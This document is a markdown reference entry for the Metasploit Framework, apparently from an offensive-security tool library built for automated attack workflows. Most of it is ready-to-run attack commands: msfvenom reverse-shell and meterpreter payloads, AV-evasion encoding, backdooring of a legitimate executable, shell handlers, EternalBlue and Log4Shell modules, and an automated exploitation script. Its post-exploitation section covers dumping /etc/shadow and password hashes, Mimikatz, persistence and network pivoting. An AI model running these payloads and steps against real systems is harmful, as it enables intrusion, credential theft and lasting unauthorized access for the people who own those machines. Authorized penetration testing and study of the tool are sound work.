---
id: "metasploit"
title: "Metasploit Framework - Exploitation & Post-Exploitation"
type: "tool"
category: "web-application"
subcategory: "business-logic"
tags: ["metasploit", "exploit", "payload", "msfvenom", "msfconsole", "post-exploitation", "reverse-shell"]
difficulty: "intermediate"
platforms: ["linux", "macos"]
source_url: "https://github.com/rapid7/metasploit-framework"
related: ["reverse-shells-cheatsheet", "attack-workflow-chains"]
updated: "2026-04-04"
---

## Overview

The Metasploit Framework is the industry-standard exploitation toolkit. It includes 2000+ exploits, 500+ payloads, and extensive post-exploitation modules. Use `msfconsole` for interactive exploitation, `msfvenom` for payload generation, and `msfrpcd` for scripted/remote access.

## Command Reference — msfconsole

```bash
# Launch console
msfconsole -q

# Search for exploits
msf6> search type:exploit name:apache
msf6> search cve:2024
msf6> search platform:linux type:exploit rank:excellent

# Use an exploit
msf6> use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf6> show options
msf6> set RHOSTS {target}
msf6> set LHOST {your_ip}
msf6> set LPORT 4444
msf6> exploit

# Background a session
msf6> sessions -l          # List sessions
msf6> sessions -i 1        # Interact with session 1
meterpreter> background     # Background current session

# Post-exploitation modules
msf6> use post/linux/gather/enum_system
msf6> set SESSION 1
msf6> run

# Non-interactive (single command)
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST {your_ip}; set LPORT 4444; exploit -j"
```

## Command Reference — msfvenom

```bash
# List payloads
msfvenom -l payloads | grep linux
msfvenom -l payloads | grep windows
msfvenom -l encoders
msfvenom -l formats

# Linux reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST={your_ip} LPORT=4444 -f elf -o shell.elf

# Linux meterpreter
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={your_ip} LPORT=4444 -f elf -o meterpreter.elf

# Windows reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST={your_ip} LPORT=4444 -f exe -o shell.exe

# Windows meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={your_ip} LPORT=4444 -f exe -o meterpreter.exe

# Web payloads
msfvenom -p php/meterpreter/reverse_tcp LHOST={your_ip} LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST={your_ip} LPORT=4444 -f raw -o shell.jsp
msfvenom -p python/meterpreter/reverse_tcp LHOST={your_ip} LPORT=4444 -f raw -o shell.py

# Shellcode for exploits
msfvenom -p linux/x64/shell_reverse_tcp LHOST={your_ip} LPORT=4444 -f python -b '\x00'
msfvenom -p windows/x64/shell_reverse_tcp LHOST={your_ip} LPORT=4444 -f c -b '\x00'

# Encoded payloads (AV evasion)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={your_ip} LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o encoded.exe

# Inject into existing executable
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={your_ip} LPORT=4444 -x original.exe -k -f exe -o backdoored.exe
```

## Common Exploit Modules

### Web Application Exploits
```
exploit/multi/http/apache_mod_cgi_bash_env_exec  — Shellshock
exploit/multi/http/tomcat_mgr_upload              — Tomcat manager upload
exploit/multi/http/jenkins_script_console          — Jenkins Groovy RCE
exploit/unix/webapp/wp_admin_shell_upload          — WordPress admin shell
exploit/multi/http/struts2_content_type_ognl       — Apache Struts RCE
exploit/multi/http/log4shell_header_injection      — Log4Shell
exploit/multi/http/spring4shell                    — Spring4Shell
```

### Network Service Exploits
```
exploit/windows/smb/ms17_010_eternalblue    — EternalBlue (SMBv1)
exploit/windows/smb/psexec                   — PsExec pass-the-hash
exploit/linux/ssh/libssh_auth_bypass         — libSSH auth bypass
exploit/multi/misc/java_rmi_server           — Java RMI
exploit/unix/ftp/vsftpd_234_backdoor         — vsFTPd backdoor
```

### Handlers (catching reverse shells)
```bash
# Multi/handler — catch any reverse shell
msfconsole -q -x "
use exploit/multi/handler;
set PAYLOAD {payload_type};
set LHOST {your_ip};
set LPORT 4444;
set ExitOnSession false;
exploit -j
"

# Common payload types for handler:
# linux/x64/shell_reverse_tcp
# linux/x64/meterpreter/reverse_tcp
# windows/x64/meterpreter/reverse_tcp
# php/meterpreter/reverse_tcp
# cmd/unix/reverse_bash
```

## Post-Exploitation (Meterpreter)

```
# System info
meterpreter> sysinfo
meterpreter> getuid
meterpreter> getpid

# File operations
meterpreter> download /etc/shadow
meterpreter> upload linpeas.sh /tmp/
meterpreter> cat /etc/passwd

# Network
meterpreter> ifconfig
meterpreter> netstat
meterpreter> portfwd add -l 8080 -p 80 -r 10.0.0.1   # Port forward
meterpreter> route add 10.0.0.0 255.255.255.0 1        # Pivot

# Privilege escalation
meterpreter> getsystem                    # Windows auto-privesc
meterpreter> run post/multi/recon/local_exploit_suggester

# Credential harvesting
meterpreter> hashdump                     # Windows SAM hashes
meterpreter> run post/linux/gather/hashdump
meterpreter> load kiwi                    # Mimikatz
meterpreter> creds_all

# Persistence
meterpreter> run persistence -U -i 30 -p 4444 -r {your_ip}
meterpreter> run post/windows/manage/enable_rdp

# Pivoting
meterpreter> run autoroute -s 10.0.0.0/24
meterpreter> run auxiliary/server/socks_proxy
```

## Resource Scripts (Automation)

```bash
# Create a resource script for automated exploitation
cat > auto_exploit.rc << 'EOF'
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j

use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS {target_range}
set THREADS 10
run
EOF

# Run it
msfconsole -q -r auto_exploit.rc
```

## Database Integration

```bash
# Start PostgreSQL for Metasploit
msfdb init
msfdb start

# Inside msfconsole
msf6> db_status                          # Check DB connection
msf6> workspace -a {project_name}        # Create workspace
msf6> db_nmap -sV -sC {target}           # Nmap with DB storage
msf6> hosts                              # List discovered hosts
msf6> services                           # List discovered services
msf6> vulns                              # List discovered vulns
msf6> creds                              # List captured creds
```

## Features

- 2000+ exploit modules across all platforms
- 500+ payload types (staged, stageless, meterpreter, shell)
- Post-exploitation with pivoting and privilege escalation
- Payload generation with encoding and AV evasion
- Database-backed tracking of hosts, services, vulns, and creds
- Resource scripts for automated attack chains
- API access via msfrpcd for integration

## Effectiveness Scores

| Target Type | Score | Notes |
|-------------|-------|-------|
| Web App | 0.70 | Strong web exploit modules, but nuclei/sqlmap better for scanning |
| API | 0.50 | Limited API-specific modules |
| Network | 0.95 | Best-in-class for network service exploitation |
| Cloud | 0.40 | Limited cloud-specific modules |
| CMS | 0.65 | WordPress, Drupal, Joomla modules available |

## Fallback Alternatives

For payload generation: manual reverse shells (see reverse-shells-cheatsheet)
For exploitation: searchsploit → exploit-db → manual PoC scripts
For post-exploitation: manual enumeration scripts (linpeas, winpeas)

## Context-Aware Parameters

```bash
# Quick exploit check (non-intrusive)
msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS {target}; run; exit"

# Payload for Linux target
msfvenom -p linux/x64/shell_reverse_tcp LHOST={your_ip} LPORT=4444 -f elf -o shell.elf

# Payload for Windows target
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={your_ip} LPORT=4444 -f exe -o shell.exe

# Payload for web target (PHP)
msfvenom -p php/meterpreter/reverse_tcp LHOST={your_ip} LPORT=4444 -f raw -o shell.php

# Catch any incoming shell
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD multi/handler; set LHOST 0.0.0.0; set LPORT 4444; exploit -j"
```

## Documentation

- [Official Documentation](https://docs.metasploit.com/)
- [Rapid7 Module Database](https://www.rapid7.com/db/modules/)
